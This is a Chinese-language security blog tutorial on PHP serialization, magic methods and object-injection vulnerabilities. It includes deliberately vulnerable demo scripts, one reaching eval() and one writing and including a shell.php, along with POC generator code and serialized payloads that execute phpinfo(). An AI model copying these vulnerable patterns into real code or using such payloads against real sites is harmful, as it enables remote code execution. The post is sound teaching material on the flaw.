---
title: PHP反序列化
date: 2017-09-11 18:13:23
tags:
		- 
categories:
		- Web安全
---

`PHP`反序列化学习整理。

<!-- more -->


##### 20170926 PHP反序列化


##### 序列化和发序列化

__[序列化_serialize](http://php.net/manual/zh/function.serialize.php)__

	string serialize(mixed $value)

>serialize 产生一个可存储的值的表示。serialize()返回字符串，此字符串包含了value的字节流，可以存储于任何地方。这样有利于存储或传递PHP的值，同时不丢失其类型和结构。
>PHP将试图在序列化动作之前调用对象成员函数__sleep()>这样就允许对象在被序列化之前做任何清除操作。

代码：

		<?php
	class secnote{
	    var $test = 'sec-note';
	}
	$class1 = new secnote;
	$class1_ser = serialize($class1);
	print_r($class1_ser);
	?>


![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-29/62475027.jpg)


	O:7:"secnote":1:{s:4:"test";s:8:"sec-note";}


其中的O代表的是存储的是对象(object).7代表对象的名称有7个字符，`secnote`表示对象的名称，1表示有一个值，`{s:4:"test";s:8:"sec-note";}`中，s表示字符串，4表示其中的长度，'test' 表示字符串的名称。



__[反序列化unserialize](http://php.net/manual/zh/function.unserialize.php)__

>unserialize对单一的已序列化的变量进行操作，将其转换会PHP的值。
>

代码

	<?php
	
	class secnote{
	    var $test = 'sec-note';
	}
	$class2 = 'O:7:"secnote":1:{s:4:"test";s:8:"sec-note";}';
	print_r($class2);
	echo "</br>";
	
	$class2_unser = unserialize($class2);
	print_r($class2_unser);
	
	
	?>


![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-29/17175231.jpg)


	O:7:"secnote":1:{s:4:"test";s:8:"sec-note";}
	secnote Object ( [test] => sec-note )


unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。


##### 类和魔术方法

创建一个正常的类，一个变量以及方法，实例化对象。

以下`test.php`

	<?php
	class Secnote{
	    public $a = "test";
	    public function iprint()
	    {
	        echo $this->a;
	    }
	}
	
	//实例化一个对象
	$b = new Secnote();
	
	//调用方法
	$b->iprint();
	?>

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-11/13964682.jpg)


上面是一个正常的实例化和方法的调用过程。有一些[魔术方法](https://secure.php.net/manual/zh/language.oop5.magic.php)在特定的情况下会自动调用。

`PHP` 将所有以 `__`（两个下划线）开头的类方法保留为魔术方法。

	__construct() 方法在每次创建新对象时会被自动调用
	
	__destruct() 方法在使用 exit() 终止脚本运行时也会被自动调用
	
	__toString() 方法在一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。


在类里面增加这三个方法。`__construct()， __destruct(), __toString()`


	<?php
	class Secnote{
	    public $a = "test";
	    public function iprint()
	    {
	        echo $this->a . '<br/>';
	    }
	    //构造函数
	    public function __construct()
	    {
	        echo "This is construct <br/>";
	    }
	    //析构函数
	    public function __destruct()
	    {
	        echo "This is destruct <br/>";
	    }
	    public function __toString()
	    {
	        return "This is toString <br/>";
	    }
	}
	
	//实例化一个对象时，__construct会被调用
	$b = new Secnote();
	
	//调用方法
	$b->iprint();
	// 对象被当作字符串时，__toString被调用
	echo $b;
	//脚本结束时，__destruct被调用
	?>


结果

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-11/5998660.jpg)



序列化和反序列化时的魔术方法。`__sleep()`和`__wakeup`

	__sleep()： serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。
	__wakeup： unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。


测试和序列化有关的魔术函数。

	<?php
	class Secnote{
	    public $a = "test1";
	    public $b = "test2";
	    public function iprint()
	    {
	        echo $this->a . '<br/>';
	    }
	    //构造函数
	    public function __construct()
	    {
	        echo "This is construct <br/>";
	    }
	    //析构函数
	    public function __destruct()
	    {
	        echo "This is destruct <br/>";
	    }
	    public function __wakeup()
	    {
	        echo "This is __wakeup<br/>";
	    }
	    public function __sleep()
	    {
	        echo "This is __sleep<br/>";
	        return array('a','b'); //返回一个包含对象中所有应被序列化的变量名称的数组
	    }
	}
	
	//实例化一个对象时，__construct会被调用
	$c = new Secnote();
	// 序列化对象调用__sleep
	$serialized = serialize($c);
	// 输出序列化之后的字符串
	print "Serialized: " . $serialized . '<br/>';
	// 反序列化调用 __wakeup
	$d = unserialize($serialized);
	// 调用方法输出数据
	$d ->iprint();
	//执行结束调用 __destruct
	
	?>

结果

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-11/5650092.jpg)


##### 反序列化漏洞

反序列化参数可控，`unserialize()`反序列化后会直接调用`__wakeup()`或`__destruct()`，这时魔术方法，本身就存在的。如果你重写了这些魔术方法，且其中存在漏洞，使用可控的序列化参数构造`payload`去触发这个漏洞。



参考[案例一](https://zhuanlan.zhihu.com/p/33426188)

反序列化漏洞需要满足的条件。

1. 程序中存在序列化字符串的输入点 (该输入点序列化字符串可被反序列化)
2. 程序中存在可以利用的魔术函数

可发序列化的代码

存在输入点，`data`参数，并且树反序列化操作的。 

`unser.php`

	<?php
	    class example{
	        public $handle;
	        function __destruct()         //析构函数，脚本调用结束时执行，
	        {
	            $this->shutdown(); // 调用了类中的shutdown()   
	        }
	        public function shutdown()
	        {
	            $this->handle->close();  //调用某个地方的close()函数
	        }
	    }
	    class process{
	        public $pid;
	        function close()
	        {
	            eval($this->pid);  //存在漏洞函数，但参数不可控
	        }
	    }
	    if(isset($_GET['data'])){
	        $user_data = unserialize(urldecode($_GET['data'])); 
		//data参数可控，进行反序列化
		// $user_data 反序列话之后的对象
	    }
	?>


这个可控点和上面的构造方法，联合一下，构造漏洞。这段代码两个类，一个`example`和`process`，在`process`中一个函数`close()`，其中危险函数`eval()`，但是参数不可控，无法执行任意代码。在`example`类中有一个`__destruct`析构函数，在脚本执行结束的时候执行，且调用可一个成员函数`shutdown()`，其作用是调用某个地方的`close()`函数。

可以去调用`process`类中的`close()`函数且`$pid`变量可控。

需要在反序列化的时候`$handle`是`process`类的一个实例化对象，`$pid`是想要执行的任意代码。

序列化代码 `POC`

`ser.php`

	<?php
	    class example{
	        public $handle;
	        function __construct()
	        {
	            $this->handle = new process();  // handle是类process 实例化的一个对象
	        }
	    }
	    class process {
	        public $pid;
	        function __construct()
	        {
	            $this->pid = 'phpinfo();';
	        }
	    }
	    $test = new example();
	    echo urlencode(serialize($test));

生成序列化之后的`payload`。

	O%3A7%3A%22example%22%3A1%3A%7Bs%3A6%3A%22handle%22%3BO%3A7%3A%22process%22%3A1%3A%7Bs%3A3%3A%22pid%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D

在可控参数上输入`payload`。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-11/36492604.jpg)

序列化的字符串进行反序列化时就会安照设定生成一个`example`类实例化，这时候已经反序列化之后了，按照`unser.php`文件中的代码逻辑执行，脚本结束后自动调用`__destruct()`函数，然后调用`shutdown()`函数，此时`$handle`为类`process`的类实例化对象，所以接下来会调用`process`的`close()`函数，`eval()`就会执行，其中的`pid`在`POC`代码中的构造函数中已经设置，造成了代码执行。

攻击线路称为`ROP(（Return-oriented programming）)`面向返回编程：

[Utilizing Code Reuse/ROP in PHP Application Exploits - owasp](https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf)

>其核心思想是在整个进程空间内现存的函数中寻找适合代码片断（gadget），并通过精心设计返回代码把各个gadget拼接起来，从而达到恶意攻击的目的。构造ROP攻击的难点在于，我们需要在整个进程空间中搜索我们需要的gadgets，这需要花费相当长的时间。但一旦完成了“搜索”和“拼接”，这样的攻击是无法抵挡的，因为它用到的都是程序中合法的的代码，普通的防护手段难以检测。

参考[案例二](https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)

存在反序列化的代码

	<?php
	class secnote {
	    var $a = 'test';
	    function __wakeup(){    //反序列化自动调用
	        $fp = fopen("shell.php","w");
	        fwrite($fp,$this->a);
	        fclose($fp);
	        
	    }
	}
	$b = $_GET['id'];
	print_r($b);
	echo "</br>";
	$d = unserialize($b);
	
	require "shell.php";
	
	?>

构造`POC`，生成`payload`。

	<?php
	class secnote {
	    var $a = 'test';
	   
	}
	$b = new secnote();
	$b->a = "<?php phpinfo(); ?>";
	$b_ser = serialize($b);
	print_r($b_ser);
	?>

序列化的结果

	O:7:"secnote":1:{s:1:"a";s:19:"<?php phpinfo(); ?>";}

利用

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-12/99020558.jpg)

其他的利用方法，有时候在`__wakeup()`或者析构函数中不存在漏洞，但是它又调用了其他的对象，向上溯源，利用一次次的`gadget`找到漏洞点。

>Makes use of POP (Property-oriented Programming) chains
Similar to ROP; reuse existing code (POP gadgets)

##### 序列化文章

[最通俗易懂的PHP反序列化分析](http://www.notyeat.com/2018/03/26/php-unserialize/)

[浅谈php反序列化漏洞](https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)

[PHP反序列化漏洞](https://www.anquanke.com/post/id/86452)

[神奇的php反序列化](https://www.anquanke.com/post/id/84705)

[PHP反序列化漏洞成因及漏洞挖掘技巧与案例](https://www.anquanke.com/post/id/84922)

[SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析](https://paper.seebug.org/39/)


[PHP反序列化漏洞详细教程及实例（上）](https://zhuanlan.zhihu.com/p/32553774)

[PHP反序列化漏洞详细教程及实例（下） Typecho 反序列化漏洞分析](https://zhuanlan.zhihu.com/p/32601669)

[由Typecho 深入理解PHP反序列化漏洞](https://zhuanlan.zhihu.com/p/33426188)

[ROP 面向返回编程](https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B)

[ROP系统攻击思想](http://spd.dropsec.xyz/2016/12/02/ROP%E7%B3%BB%E7%BB%9F%E6%94%BB%E5%87%BB%E6%80%9D%E6%83%B3/)

[Utilizing Code Reuse/ROP in PHP Application Exploits - owasp](https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf)


[PPT--Practical PHP Object Injection - Insomnia Security](https://www.insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf)

[Code Reuse Attacks in PHP:Automated POP Chain Generation](https://www.ei.rub.de/media/emma/veroeffentlichungen/2014/09/10/POPChainGeneration-CCS14.pdf)

